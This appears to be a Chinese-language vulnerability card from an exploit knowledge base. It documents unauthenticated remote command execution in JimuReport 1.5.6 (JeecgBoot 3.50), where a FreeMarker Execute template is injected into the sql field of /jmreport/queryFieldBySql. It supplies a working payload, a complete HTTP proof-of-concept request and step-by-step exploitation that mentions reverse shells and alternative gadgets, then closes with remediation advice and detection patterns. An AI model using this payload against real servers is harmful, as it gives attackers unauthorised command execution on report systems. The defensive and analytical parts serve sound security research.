---
id: web-java-component-jimureport-queryfieldbysql-execute-ssti-rce
title: JimuReport 1.5.6 /jmreport/queryFieldBySql 未授权 FreeMarker ?new Execute RCE：SQL 关键字 WAF 只在渲染后检查
type: scenario
domain: web
path: web/java/component
technique: freemarker-execute-ssti-before-sql
aliases:
- 积木报表 queryFieldBySql RCE
- JimuReport FreeMarker Execute
- jeecg-boot queryFieldBySql 命令执行
- JeecgBoot 3.50 前台 RCE
- freemarker.template.utility.Execute
tags:
- jimureport
- jeecgboot
- java
- freemarker
- ssti
- rce
- unauth
cve: []
severity: critical
confidence: high
affected_versions: JimuReport 1.5.6（JeecgBoot 3.50 内置；原文测试版本）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V295
  verified_at: '2026-11-08T08:34:51+08:00'
  notes: 已完整读 content.md 与全部19张图核对：图10 @PostMapping(/queryFieldBySql)取sql→i.a校验→parseReportSql(sql,dbSource,paramArray,type)；图12 parseReportSql调用；图13 jmFilter注册queryFieldBySql/loadTableData；图17 FreeMarkerUtils.a渲染后返回FreeMarker template error:Cannot run program "touch"(证明Execute已触发、仅测试环境无touch)；图11/14/15为调试与SQL处理；原文WAF黑名单(and |extractvalue|...|exec |...|user())与卡内逐字一致，Execute不在其中。PoC与原文完全一致。单卡原子(FreeMarker ?new Execute SSTI)，粒度合适。affected_versions原文明确JimuReport 1.5.6(JeecgBoot3.50内置)，卡内已填且正确。dedup最高分为卡自身exact自匹配；与同端点include文件读取(cos0.9145)、ObjectConstructor-Nashorn内存马(cos0.9242)、save单元格注入、qurestSql等均为不同gadget/入口，dup-scan pair均verdict=related，保留。testConnection场景已有既有卡web-java-component-jimureport-testconnection-jdbc-h2-javascript-trigger-rce承接(同sink)，故本篇不新增亦不标needs_extraction。未验证点：未复现目标环境。
---

## 一句话结论

`POST /jeecg-boot/jmreport/queryFieldBySql` 把请求里的 `sql` 字段先当 FreeMarker 模板渲染、再交给数据库执行；JimuReport 1.5.6 的 `?new` 解析器允许实例化 `freemarker.template.utility.Execute`，因此提交 `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("touch /tmp/success")}` 即可在 SQL 执行前命令执行，而内置 `jmFilter` 只黑名单 SQL 关键字，完全拦不住模板表达式。

## 原理

- 入口在 `jimureport-spring-boot-starter-1.5.6.jar` 的 `org.jeecg.modules.jmreport.desreport.a.a#c`：

  ```java
  @PostMapping("/queryFieldBySql")
  public Result<?> c(@RequestBody JSONObject var1) {
      String var2 = var1.getString("sql");
      try { i.a(var2); } catch (JimuReportException e) { return Result.error(...); }
      String var3 = var1.getString("dbSource");
      Object var4 = var1.get("paramArray");
      String var5 = var1.getString("type");
      ...
      Map var12 = this.reportDbService.parseReportSql(var2, var3, var4, var5);
      ...
  }
  ```

  方法注释直接写着「解析sql」；`i.a(var2)` 是对 SQL 的初步校验，`parseReportSql` 才是把 `sql` 交给模板解析的入口。
- `parseReportSql` 内部（debug 可见）会调用 `FreeMarkerUtils.a(var1, var2)` 对 SQL 字符串做模板渲染：

  ```text
  var1 = FreeMarkerUtils.a(var1, var2);
  return var1;
  ```

  也就是说攻击者控制的不是「最终 SQL」而是「FreeMarker 模板源码」。模板里的 `${...}` 与 `<#assign ...>` 在渲染阶段就会求值，渲染结果随后才进入数据库执行。因此即使 SQL 最终非法/被数据库拒绝，命令也已经执行。
- 直接命令执行的 payload：

  ```freemarker
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("touch /tmp/success")}
  ```

  `?new` 是 FreeMarker 的内置构造器，`freemarker.template.utility.Execute` 实现了 `TemplateMethodModelEx`，在渲染时用 `Runtime.exec`/`ProcessBuilder` 执行参数中的命令。JimuReport 1.5.6 使用的 FreeMarker 解析器允许该类的 `?new`，因此无需绕 `TemplateClassResolver`。
- 为什么 WAF 无效：JimuReport 注册了 `jmFilterRegistration`，只把 `jmFilter` 挂到 `["/jmreport/queryFieldBySql", "/jmreport/loadTableData"]`，其黑名单是：

  ```text
  and |extractvalue|updatexml|geohash|gtid_subset|gtid_subtract|exec |insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |;|or |+|user()
  ```

  这些都是 SQL 关键字/函数（且带尾随空格、大小写敏感），而 FreeMarker 的 `<#assign>`、`${}`、`?new`、`Execute` 均不在列表中；`Execute` 与 `exec ` 也不同（无空格且大小写不同）。过滤器还只检查请求原文，不检查渲染结果。
- 命令执行证据：调试时 `FreeMarkerUtils.a` 的返回值显示 `FreeMarker template error (DEBUG mode; use RETHROW in production!): Cannot run program "touch": CreateProcess error=...`——说明模板已经进入 `Execute` 并尝试创建进程，只是测试环境是 Windows、没有 `touch` 命令；Linux 目标换成实际命令即可。

## 触发条件

- 目标为 JimuReport 1.5.6（JeecgBoot 3.50 内置）或同源版本，暴露 `/jeecg-boot/jmreport/queryFieldBySql`（上下文路径可能是 `/jmreport/queryFieldBySql`）。
- 接口未鉴权（PoC 无 token）或攻击者已获得任意可用 token。
- FreeMarker 的解析器允许 `freemarker.template.utility.Execute?new`；较新版本把默认解析器收紧为 SAFER_RESOLVER 后，本 payload 会被拒，需要改用 `ObjectConstructor`/`jeecg.compute` 等其他 gadget（见关联卡）。
- `jmFilter` 只覆盖上述两个 URL 且只做 SQL 关键字黑名单，不阻止模板语法。

## 利用步骤

1. 先发 `{"sql":"select 1","type":"0"}` 确认接口可达与返回结构；若返回统一异常，查看是否包含「解析SQL」相关错误。
2. 发送带 FreeMarker 的 payload，把命令换成一个可验证副作用：`touch /tmp/success`、`id > /tmp/x`、DNS/HTTP 外带或反弹 shell。
3. 若响应报 FreeMarker 模板错误（如 `Cannot run program`），说明 `Execute` 已被触发，只是命令不存在/权限不足；按目标 OS 调整命令与路径。
4. 若直接 `Execute` 被解析器拒绝，改用 `ObjectConstructor` 构造 `ScriptEngineManager`→Nashorn 的链，或 `jeecg.compute` 的 Aviator 链（见关联卡）。
5. 成功后用 `type` 参数与 `dbSource` 保持请求形态合法；响应 JSON 的 `success:false` 不代表命令未执行，应以副作用/回连为准。

## PoC

```http
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/json
Content-Length: 121
Connection: close

{
    "sql": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"touch /tmp/success\")}",
    "type": "0"
}
```

Linux 目标执行 `touch /tmp/success` 后检查文件时间戳；Windows 目标可把命令换成 `cmd /c calc` 或写文件。若仅需验证渲染，可用 `${7*7}` 观察响应/错误中是否出现 `49`。

## 变体与关联

- 同一接口的其他利用面：`<#include>` 任意文件读取、`${'s'}${'leep'}(10)` 绕过 sleep 过滤的时间盲注、`ObjectConstructor`→Nashorn→defineClass 内存马（详见 `web/java/component` 下已有 JimuReport queryFieldBySql 各卡）。本卡的差异是 **1.5.6 旧版直接 `?new Execute`**，不需要 SAFER_RESOLVER 绕过。
- `/jmreport/save` 的单元格表达式注入也支持 `?new Execute`，但入口不同；本卡是查询接口未授权入口。
- `/jmreport/qurestSql` 不经过 FreeMarker 模板（参数渲染进数据库里的 `db_dyn_sql`），是 SQL 注入而非 SSTI，见 JimuReport qurestSql 卡。
- 通用手法：`web/generic/ssti` 下 FreeMarker `Execute`/`ObjectConstructor`/`?api` 卡可作为语法与版本差异参考。

## 检测与防御

- 修复：不要把请求参数当 FreeMarker 模板；SQL 只允许参数化查询，禁止模板渲染用户输入；升级 JimuReport/FreeMarker 并配置 `TemplateClassResolver.SAFER_RESOLVER` 或 `ALLOWS_NOTHING_RESOLVER`。
- 输入校验：对 `sql` 字段做结构化白名单（仅允许单条 SELECT、参数占位符），拒绝 `<#`、`${`、`?new`、`?api` 等模板语法；校验必须针对最终模板源码，而不是只过滤 SQL 关键字。
- 鉴权：`queryFieldBySql` 等报表调试接口要求管理员权限，禁止前台匿名访问。
- 检测：监控 `sql` 字段中出现 `<#assign>`、`${`、`?new`、`Execute`、`ObjectConstructor`、`ScriptEngineManager` 的请求；对 `FreeMarker template error` 日志、`Runtime.exec`/进程创建告警；响应返回 SQL 错误但请求含模板语法时重点排查。
- 排查：检查 JimuReport/FreeMarker 版本与解析器配置，审计 `/jmreport/*` 的匿名访问与历史请求，核对主机上异常进程/临时文件。
